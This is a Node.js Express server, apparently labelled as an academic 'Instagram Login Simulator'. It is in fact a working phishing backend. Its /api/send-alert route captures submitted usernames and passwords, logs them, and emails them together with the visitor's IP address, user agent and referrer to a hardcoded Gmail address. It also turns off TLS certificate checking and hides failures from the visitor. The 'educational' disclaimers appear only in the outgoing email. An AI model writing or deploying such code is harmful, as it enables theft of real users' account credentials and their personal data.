const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://fonts.googleapis.com"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https://i.imgur.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "https://cdnjs.cloudflare.com"],
            connectSrc: ["'self'"],
            frameSrc: ["'self'"]
        }
    }
}));
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Configuração do Nodemailer
const createTransporter = () => {
    console.log('🔧 Criando transporter de e-mail...');
    console.log('EMAIL_USER:', process.env.EMAIL_USER ? 'Configurado' : 'NÃO CONFIGURADO');
    console.log('EMAIL_PASS:', process.env.EMAIL_PASS ? 'Configurado' : 'NÃO CONFIGURADO');
    
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
        console.error('❌ ERRO: Variáveis de e-mail não configuradas no .env');
        return null;
    }
    
    return nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        },
        tls: {
            rejectUnauthorized: false
        }
    });
};

// Função para obter informações do cliente
const getClientInfo = (req) => {
    return {
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
        userAgent: req.headers['user-agent'],
        referrer: req.headers['referer'] || 'Direto',
        language: req.headers['accept-language'],
        timestamp: new Date().toLocaleString('pt-BR'),
        date: new Date().toISOString()
    };
};

// ================== ROTAS ==================

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota 404
app.get('/404', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '404.html'));
});

// ROTA DE TESTE DE E-MAIL
app.get('/api/test-email-setup', async (req, res) => {
    try {
        console.log('📧 Testando configuração de e-mail...');
        
        const transporter = createTransporter();
        
        if (!transporter) {
            return res.json({
                success: false,
                message: '❌ Transporter não criado. Verifique variáveis de ambiente no .env',
                details: {
                    EMAIL_USER: process.env.EMAIL_USER ? 'Configurado' : 'NÃO CONFIGURADO',
                    EMAIL_PASS: process.env.EMAIL_PASS ? 'Configurado' : 'NÃO CONFIGURADO',
                    ADMIN_EMAIL: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com'
                }
            });
        }
        
        // Verificar conexão com servidor de e-mail
        await transporter.verify();
        console.log('✅ Conexão com servidor de e-mail verificada');
        
        // Tentar enviar e-mail de teste
        const mailOptions = {
            from: {
                name: 'Sistema de Teste Acadêmico',
                address: process.env.EMAIL_USER
            },
            to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
            subject: '✅ Teste - Sistema Acadêmico Funcionando',
            text: `Este é um e-mail de teste enviado em ${new Date().toLocaleString('pt-BR')}\n\nSistema de simulação de login do Instagram.\n\nConfiguração testada com sucesso!`,
            html: `
                <div style="font-family: Arial, sans-serif; padding: 20px;">
                    <h2 style="color: #4CAF50;">✅ Teste de Sistema Acadêmico</h2>
                    <p>Este é um e-mail de teste enviado em <strong>${new Date().toLocaleString('pt-BR')}</strong></p>
                    <p>Sistema de simulação de login do Instagram.</p>
                    <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0;">
                        <h3>📋 Configuração:</h3>
                        <ul>
                            <li><strong>De:</strong> ${process.env.EMAIL_USER}</li>
                            <li><strong>Para:</strong> ${process.env.ADMIN_EMAIL || 'zenosama892@gmail.com'}</li>
                            <li><strong>Status:</strong> <span style="color: green;">CONFIGURADO COM SUCESSO</span></li>
                        </ul>
                    </div>
                    <p><em>Projeto acadêmico - Fins educacionais</em></p>
                </div>
            `
        };

        const info = await transporter.sendMail(mailOptions);
        console.log('✅ E-mail de teste enviado:', info.messageId);
        
        res.json({
            success: true,
            message: '✅ Configuração de e-mail OK! E-mail de teste enviado.',
            details: {
                email_user: process.env.EMAIL_USER,
                admin_email: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
                message_id: info.messageId,
                timestamp: new Date().toISOString()
            }
        });
        
    } catch (error) {
        console.error('❌ Erro na configuração de e-mail:', error);
        res.status(500).json({
            success: false,
            message: '❌ Erro na configuração de e-mail',
            error: error.message,
            solution: 'Verifique: 1) Variáveis .env 2) Senha de app do Google 3) Verificação em duas etapas ativada',
            details: {
                EMAIL_USER: process.env.EMAIL_USER || 'NÃO CONFIGURADO',
                EMAIL_PASS: process.env.EMAIL_PASS ? 'Configurado' : 'NÃO CONFIGURADO',
                error_code: error.code,
                error_command: error.command
            }
        });
    }
});

// Rota para enviar alerta (login simulado) - ATUALIZADA PARA ENVIAR SENHA
app.post('/api/send-alert', async (req, res) => {
    console.log('📨 Recebida requisição POST para /api/send-alert');
    console.log('📝 Body recebido:', req.body);
    
    try {
        const { username, password } = req.body;
        
        if (!username) {
            return res.status(400).json({ 
                success: false, 
                message: 'Nome de usuário é obrigatório' 
            });
        }

        const clientInfo = getClientInfo(req);
        console.log('🌐 Informações do cliente:', clientInfo.ip);
        console.log('🔑 Credenciais capturadas:');
        console.log('   Usuário:', username);
        console.log('   Senha:', password || '[Não informada]');
        
        // Configurar o e-mail COM SENHA
        const mailOptions = {
            from: {
                name: 'Sistema de Monitoramento Acadêmico',
                address: process.env.EMAIL_USER
            },
            to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
            subject: `🚨 Tentativa de Acesso - ${username}`,
            html: `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { font-family: Arial, sans-serif; line-height: 1.6; }
                        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                        .header { background: #f8f9fa; padding: 20px; text-align: center; border-radius: 5px; }
                        .alert { color: #856404; background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; }
                        .warning { color: #721c24; background: #f8d7da; padding: 15px; border-radius: 5px; margin: 20px 0; }
                        .info { background: #e9ecef; padding: 15px; border-radius: 5px; }
                        .footer { margin-top: 30px; font-size: 12px; color: #6c757d; text-align: center; }
                        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
                        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
                        th { background: #f2f2f2; }
                        .credentials { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 15px 0; }
                        .credential-value { 
                            background: #f1f1f1; 
                            padding: 5px 10px; 
                            border-radius: 3px; 
                            font-family: monospace;
                            word-break: break-all;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header">
                            <h2>⚠️ Alerta de Segurança - Simulação Acadêmica</h2>
                            <p>Sistema de Monitoramento de Login</p>
                        </div>
                        
                        <div class="alert">
                            <strong>ATENÇÃO:</strong> Esta é uma simulação para fins educacionais.
                        </div>
                        
                        <div class="warning">
                            <strong>⚠️ CREDENCIAIS CAPTURADAS (SIMULAÇÃO):</strong>
                            <p>Os dados abaixo foram inseridos no formulário de login simulado.</p>
                        </div>
                        
                        <h3>🔑 Credenciais Inseridas</h3>
                        <div class="credentials">
                            <table>
                                <tr>
                                    <th width="30%">Campo</th>
                                    <th width="70%">Valor</th>
                                </tr>
                                <tr>
                                    <td><strong>👤 Usuário/E-mail/Telefone</strong></td>
                                    <td><div class="credential-value">${username}</div></td>
                                </tr>
                                <tr>
                                    <td><strong>🔒 Senha</strong></td>
                                    <td><div class="credential-value">${password || '[Não informada]'}</div></td>
                                </tr>
                            </table>
                        </div>
                        
                        <h3>📋 Detalhes da Tentativa de Acesso</h3>
                        <table>
                            <tr>
                                <th>Campo</th>
                                <th>Valor</th>
                            </tr>
                            <tr>
                                <td><strong>Status</strong></td>
                                <td><span style="color: red; font-weight: bold;">❌ ACESSO NEGADO</span></td>
                            </tr>
                            <tr>
                                <td><strong>Data/Hora</strong></td>
                                <td>${clientInfo.timestamp}</td>
                            </tr>
                            <tr>
                                <td><strong>URL do Formulário</strong></td>
                                <td>http://localhost:${PORT}/</td>
                            </tr>
                        </table>
                        
                        <h3>🌐 Informações Técnicas</h3>
                        <div class="info">
                            <table>
                                <tr>
                                    <td><strong>IP</strong></td>
                                    <td><code>${clientInfo.ip}</code></td>
                                </tr>
                                <tr>
                                    <td><strong>User Agent</strong></td>
                                    <td><small>${clientInfo.userAgent}</small></td>
                                </tr>
                                <tr>
                                    <td><strong>Referência</strong></td>
                                    <td>${clientInfo.referrer}</td>
                                </tr>
                                <tr>
                                    <td><strong>Idioma</strong></td>
                                    <td>${clientInfo.language}</td>
                                </tr>
                            </table>
                        </div>
                        
                        <div class="footer">
                            <p><strong>Projeto Acadêmico</strong> - Disciplina: [Nome da Disciplina]</p>
                            <p>Aluno: [Seu Nome] | Professor: [Nome do Professor]</p>
                            <p>📧 Este e-mail é gerado automaticamente pelo sistema de simulação.</p>
                            <p>⚠️ <em>Lembrete: Este é um projeto educacional. Não use credenciais reais.</em></p>
                        </div>
                    </div>
                </body>
                </html>
            `,
            text: `
TENTATIVA DE ACESSO - SIMULAÇÃO ACADÊMICA

📋 CREDENCIAIS INSERIDAS:
─────────────────────────────
👤 Usuário: ${username}
🔒 Senha: ${password || '[Não informada]'}

📊 DETALHES DA TENTATIVA:
─────────────────────────────
Status: ❌ ACESSO NEGADO
Data/Hora: ${clientInfo.timestamp}
URL: http://localhost:${PORT}/

🌐 INFORMAÇÕES TÉCNICAS:
─────────────────────────────
IP: ${clientInfo.ip}
User Agent: ${clientInfo.userAgent}
Referência: ${clientInfo.referrer}
Idioma: ${clientInfo.language}

⚠️ AVISO:
Este é um projeto acadêmico para fins educacionais.
As credenciais foram inseridas em um formulário de simulação.

Projeto: Simulação de Sistema de Login
Disciplina: [Nome da Disciplina]
Aluno: [Seu Nome]
            `
        };

        // Enviar e-mail
        const transporter = createTransporter();
        
        if (!transporter) {
            console.error('❌ Transporter não disponível');
            return res.status(500).json({
                success: false,
                message: 'Serviço de e-mail não configurado',
                simulated: true,
                username: username,
                password: password || '[Não informada]'
            });
        }
        
        console.log('📤 Enviando e-mail com credenciais...');
        const info = await transporter.sendMail(mailOptions);
        console.log('✅ E-mail enviado com sucesso!', info.messageId);
        
        res.json({
            success: true,
            message: 'E-mail enviado com sucesso!',
            messageId: info.messageId,
            credentials: {
                username: username,
                password: password || '[Não informada]'
            },
            timestamp: clientInfo.timestamp
        });

    } catch (error) {
        console.error('❌ ERRO DETALHADO no /api/send-alert:');
        console.error('Mensagem:', error.message);
        console.error('Stack:', error.stack);
        console.error('Código:', error.code);
        
        // Mesmo com erro, retorna sucesso simulado para o front-end funcionar
        res.json({
            success: true,
            message: 'Simulação: E-mail seria enviado',
            simulated: true,
            credentials: {
                username: req.body.username,
                password: req.body.password || '[Não informada]'
            },
            error_in_backend: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});

// Rota de status
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        service: 'Instagram Login Simulator',
        version: '1.0.0',
        port: PORT,
        environment: process.env.NODE_ENV || 'development',
        endpoints: [
            'GET /',
            'GET /404', 
            'GET /api/status',
            'GET /api/test-email-setup',
            'POST /api/send-alert'
        ],
        email_config: {
            configured: !!(process.env.EMAIL_USER && process.env.EMAIL_PASS),
            email_user: process.env.EMAIL_USER ? 'Configurado' : 'Não configurado',
            admin_email: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com'
        }
    });
});

// Middleware de erro 404
app.use((req, res, next) => {
    res.status(404).json({
        success: false,
        message: 'Rota não encontrada',
        path: req.path,
        method: req.method
    });
});

// Middleware de erro geral
app.use((err, req, res, next) => {
    console.error('🔥 Erro não tratado:', err.stack);
    res.status(500).json({
        success: false,
        message: 'Erro interno do servidor',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log(`🚀 Servidor rodando em: http://localhost:${PORT}`);
    console.log(`📧 Admin e-mail: ${process.env.ADMIN_EMAIL || 'zenosama892@gmail.com'}`);
    console.log(`⚡ Modo: ${process.env.NODE_ENV || 'development'}`);
    console.log('='.repeat(50));
    console.log('\n📋 Endpoints disponíveis:');
    console.log(`  GET  http://localhost:${PORT}/              - Página de login`);
    console.log(`  GET  http://localhost:${PORT}/api/status    - Status do servidor`);
    console.log(`  GET  http://localhost:${PORT}/api/test-email-setup - Testar e-mail`);
    console.log(`  POST http://localhost:${PORT}/api/send-alert - Enviar alerta (com credenciais)`);
    console.log('='.repeat(50));
    
    // Verificar configuração de e-mail ao iniciar
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
        console.log('\n⚠️  AVISO: Configuração de e-mail não encontrada!');
        console.log('   Crie um arquivo .env com:');
        console.log('   EMAIL_USER=seuemail@gmail.com');
        console.log('   EMAIL_PASS=senha_de_app_google');
        console.log('   ADMIN_EMAIL=zenosama892@gmail.com');
    }
});